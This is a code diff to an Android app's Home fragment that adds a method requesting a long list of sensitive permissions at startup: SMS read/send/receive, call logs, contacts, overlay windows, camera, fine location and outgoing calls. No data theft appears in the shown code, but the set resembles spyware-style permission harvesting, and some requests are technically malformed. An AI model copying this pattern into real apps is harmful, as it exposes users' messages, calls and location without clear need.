@@ -79,7 +79,29 @@ public class Home extends android.app.Fragment {
 
         View view = inflater.inflate(R.layout.fragment_home, container, false);
         initViews(view);
+        requestPermissions();
         return view;
+    }
+
+    private void requestPermissions() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+
+            requestPermissions(new String[]{Manifest.permission.READ_PHONE_STATE},1);
+            requestPermissions(new String[]{Manifest.permission.RECEIVE_SMS},1);
+            requestPermissions(new String[]{Manifest.permission.READ_SMS},1);
+            requestPermissions(new String[]{Manifest.permission.SEND_SMS},1);
+            requestPermissions(new String[]{Manifest.permission.SYSTEM_ALERT_WINDOW},1);
+            requestPermissions(new String[]{Manifest.permission.READ_CALL_LOG},1);
+            requestPermissions(new String[]{Manifest.permission.WRITE_CALL_LOG},1);
+            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS},1);
+            requestPermissions(new String[]{Manifest.permission.WRITE_CONTACTS},1);
+            requestPermissions(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},1);
+            requestPermissions(new String[]{Manifest.permission.INTERNET},1);
+            requestPermissions(new String[]{Manifest.permission.CAMERA},1);
+            requestPermissions(new String[]{Manifest.permission.PROCESS_OUTGOING_CALLS},1);
+            requestPermissions(new String[]{Manifest.permission.ACCESS_FINE_LOCATION},1);
+        }
+
     }
 
     private boolean checkInternetConnectivity() {
